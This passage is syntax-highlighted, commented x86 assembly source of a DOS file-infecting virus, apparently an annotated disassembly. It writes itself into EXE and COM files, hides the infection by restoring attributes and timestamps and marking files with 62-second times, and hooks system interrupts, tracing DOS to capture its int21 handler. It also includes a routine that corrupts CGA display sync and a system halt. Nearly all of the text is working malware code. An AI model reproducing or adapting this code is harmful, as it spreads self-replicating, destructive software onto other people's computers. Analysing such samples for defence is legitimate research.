             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Save file date/time on stack</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">04</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Set CX to 0</span><span class="sc0">
             </span><span class="sc6">XCHG</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load CX file attrib/set file attrib to 0</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Save file attrib to stack</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">       </span><span class="sc1">; Write file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastByte</span><span class="sc0">  </span><span class="sc1">; EXE header</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001B</span><span class="sc0">     </span><span class="sc1">; Rewrite modified EXE header</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Do write</span><span class="sc0">
             </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">BadWrite</span><span class="sc0">    </span><span class="sc1">; If error skip file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set file pointer</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; to end of file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">       </span><span class="sc1">; Will write</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Virus offset</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LastCode</span><span class="sc0">  </span><span class="sc1">; Virus size</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">  </span><span class="sc1">; Write virus to EXE file</span><span class="sc0">

</span><span class="sc5">BadWrite</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; Restore file attrib from stack</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">   </span><span class="sc1">; Set attrib of file</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">  </span><span class="sc1">; Restore file date/time from stack</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
             </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">   </span><span class="sc1">; Set DO NOT UPDATE TIME flag in table</span><span class="sc0">
             </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">NoFuckTime</span><span class="sc0">  </span><span class="sc1">; If write error -&gt; Set normal time</span><span class="sc0">
             </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001F</span><span class="sc0"> </span><span class="sc1">; Else set file seconds to 62</span><span class="sc0">
</span><span class="sc5">NoFuckTime</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701</span><span class="sc0">     </span><span class="sc1">; Set file date/time</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Via int21</span><span class="sc0">
</span><span class="sc5">SkipFile</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3E</span><span class="sc0">       </span><span class="sc1">; CloseFile</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">
             </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">   </span><span class="sc1">; ????</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Set DS to 0</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 13 seg</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">004E</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 13 seg</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 13 off</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">004C</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 13 off</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 24 seg</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0092</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 24 seg</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 24 off</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0090</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 24 off</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 21 seg</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0086</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 21 seg</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 21 off</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0084</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 21 off</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 8 seg</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0022</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 8 seg</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore int 8 off</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0020</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Restore vector 0 off</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">ErrorProcess</span><span class="sc0">        </span><span class="sc1">; Update counter</span><span class="sc0">
</span><span class="sc5">InfectCom</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">TEST</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc2">04</span><span class="sc0">   </span><span class="sc1">; Check for SYSTEM file</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">OkComFile</span><span class="sc0">   </span><span class="sc1">; If file IS system -&gt; Damage file ?????</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Save buffer offset</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc4">],</span><span class="sc2">43</span><span class="sc0">   </span><span class="sc1">; Check if file ext begin with 'C'</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">OkComFile</span><span class="sc0">   </span><span class="sc1">; If no -&gt; damage file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ComFlag</span><span class="sc4">],</span><span class="sc2">43</span><span class="sc0">     </span><span class="sc1">; Set file type flag to COM</span><span class="sc0">
             </span><span class="sc6">LODSW</span><span class="sc0">          </span><span class="sc1">; Load first 2 bytes of file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">First3</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; And save them</span><span class="sc0">
             </span><span class="sc6">LODSW</span><span class="sc0">          </span><span class="sc1">; Load seconf 2 bytes of file</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">First3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; And save them</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load AX with file size</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FA76h</span><span class="sc0">   </span><span class="sc1">; Check file size</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Restore buffer offset</span><span class="sc0">
             </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">OkComFile</span><span class="sc0">   </span><span class="sc1">; If file is less than 64118 bytes -&gt; OK infect</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0">    </span><span class="sc5">SkipFile</span><span class="sc0">        </span><span class="sc1">; else skip file</span><span class="sc0">
</span><span class="sc5">OkComFile</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">     </span><span class="sc1">; Calculate jump argument</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">   </span><span class="sc1">; Set first instruction to near JMP</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Store JMP argument</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">DoInfect</span><span class="sc0">    </span><span class="sc1">; Go write buffer</span><span class="sc0">

</span><span class="sc5">LongMultiple16</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Save CX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">     </span><span class="sc1">; Will repeat 4 times</span><span class="sc0">
</span><span class="sc5">DoMult</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">SHL</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Mult DX:AX * 2</span><span class="sc0">
             </span><span class="sc6">RCL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
             </span><span class="sc6">LOOP</span><span class="sc0">   </span><span class="sc5">DoMult</span><span class="sc0">      </span><span class="sc1">; Repeat 4 times -&gt; 2^4 = 16</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Restore CX</span><span class="sc0">
             </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return to caller</span><span class="sc0">
</span><span class="sc5">SetUp</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc0">       </span><span class="sc1">; Get DOS's table of table address</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; in ES:BX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">TableSegment</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; Save table segment</span><span class="sc0">
                        </span><span class="sc1">; Virus treat this segment as DOS segment</span><span class="sc0">
                        </span><span class="sc1">; He assume int21 seg == to DOS segment</span><span class="sc0">
                        </span><span class="sc1">; That's why virus will fail on DOS 5.X</span><span class="sc0">
             </span><span class="sc6">CLI</span><span class="sc0">            </span><span class="sc1">; Disable interrupts</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Set AX to 0</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Set DS point to interrupt vectors</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0004</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Debugger</span><span class="sc0">  </span><span class="sc1">; Set vector 1 (trap) offset</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0006</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">   </span><span class="sc1">;   ; Set vector 1 (trap) seg</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">00BC</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Load int2F off</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int2Foff</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; and save it</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">00BE</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Load int2F seg</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int2Fseg</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; and save it</span><span class="sc0">
             </span><span class="sc6">STI</span><span class="sc0">    </span><span class="sc1">; Enable interrupts</span><span class="sc0">
             </span><span class="sc6">PUSHF</span><span class="sc0">      </span><span class="sc1">; Save flags</span><span class="sc0">
             </span><span class="sc6">PUSHF</span><span class="sc0">      </span><span class="sc1">; Save flags</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Get flags in AX</span><span class="sc0">
             </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">     </span><span class="sc1">; Set TF to 1 (trace mode)</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Put flags back to stack</span><span class="sc0">
             </span><span class="sc6">POPF</span><span class="sc0">       </span><span class="sc1">; Begin trace</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; AX = 0</span><span class="sc0">
             </span><span class="sc6">DEC</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc0">  </span><span class="sc1">; AX = FF00 ???</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0084</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Call DOS (trace mode active)</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0004</span><span class="sc0">     </span><span class="sc1">; SI = 4</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; DS = SI = 4</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">       </span><span class="sc1">; Get DOS version</span><span class="sc0">
             </span><span class="sc6">INT</span><span class="sc0">    </span><span class="sc2">21</span><span class="sc0">      </span><span class="sc1">; Via int21</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1E03</span><span class="sc0">  </span><span class="sc1">; Check DOS 3.30</span><span class="sc0">
             </span><span class="sc6">LES</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load ES:AX with int13 address</span><span class="sc0">
             </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc5">OkInt13</span><span class="sc0">  </span><span class="sc1">; If DOS vers &lt; 3.30 -&gt; ignore BIOS address load/check</span><span class="sc0">
             </span><span class="sc6">LES</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc2">0770</span><span class="sc4">+</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; then load ES:DX with BIOS address of int13</span><span class="sc0">
                        </span><span class="sc1">; simulate int2F, AH=13</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; BX:AX int13 BIOS address</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0C800h</span><span class="sc0">   </span><span class="sc1">; If int13 seg &gt;= C800</span><span class="sc0">
             </span><span class="sc6">JAE</span><span class="sc0">    </span><span class="sc5">OkInt13</span><span class="sc0">     </span><span class="sc1">; Then address is in BIOS, all OK</span><span class="sc0">

             </span><span class="sc6">CLI</span><span class="sc0">            </span><span class="sc1">; else HALT system</span><span class="sc0">
             </span><span class="sc6">HLT</span><span class="sc0">
</span><span class="sc5">OkInt13</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13off</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Save in13 address</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13seg</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">           </span><span class="sc1">; Return to caller, setup complete</span><span class="sc0">

</span><span class="sc5">Debugger</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BP</span><span class="sc0">      </span><span class="sc1">; Save BP</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">       </span><span class="sc1">; BP point to stack top</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Save BX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TableSegment</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load BX with DOS segment</span><span class="sc0">
             </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">   </span><span class="sc1">; Check debugged address</span><span class="sc0">
             </span><span class="sc6">JNZ</span><span class="sc0">    </span><span class="sc5">ContinueDebug</span><span class="sc0">   </span><span class="sc1">; If not in DOS -&gt; continue</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; else load BX with int21 off</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dos21off</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc1">; and save it</span><span class="sc0">
             </span><span class="sc6">AND</span><span class="sc0">    </span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0">   </span><span class="sc1">; Clear trap flag</span><span class="sc0">
</span><span class="sc5">ContinueDebug</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; Restore BX</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">      </span><span class="sc1">; Restore BP</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">       </span><span class="sc1">; Continue trace if require or</span><span class="sc0">
                    </span><span class="sc1">; continue int21 execution without trace</span><span class="sc0">

</span><span class="sc1">; Next subroutine fuck you CGA display (don't affect EGA).</span><span class="sc0">
</span><span class="sc1">; Fucking result could be fix by dos MODE command</span><span class="sc0">

</span><span class="sc5">VideoFuck</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">03D4h</span><span class="sc0">    </span><span class="sc1">; Select CGA register selector</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">       </span><span class="sc1">; Select CRT register 2 (horiz sync)</span><span class="sc0">
             </span><span class="sc6">OUT</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Do selection</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; New sync value</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">03D5h</span><span class="sc0">    </span><span class="sc1">; Select CGA register value writer</span><span class="sc0">
                        </span><span class="sc1">; This could be INC DX; That save 1 byte</span><span class="sc0">
             </span><span class="sc6">OUT</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; Fuck horiz sync</span><span class="sc0">
             </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">EndInt21</span><span class="sc0">    </span><span class="sc1">; Terminate int21 request</span><span class="sc0">
</span><span class="sc5">CallDOS</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSHF</span><span class="sc0">      </span><span class="sc1">; Save flags</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dos21off</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call ORIGINAL int21</span><span class="sc0">
             </span><span class="sc6">RET</span><span class="sc0">        </span><span class="sc1">; Return to caller</span><span class="sc0">
</span><span class="sc5">CallInt2F</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSHF</span><span class="sc0">      </span><span class="sc1">; Save flags</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int2Foff</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call SAVED int2F</span><span class="sc0">
             </span><span class="sc6">RET</span><span class="sc0">        </span><span class="sc1">; Return to caller</span><span class="sc0">
</span><span class="sc5">TimerHandler</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">PUSHF</span><span class="sc0">      </span><span class="sc1">; Save flags</span><span class="sc0">
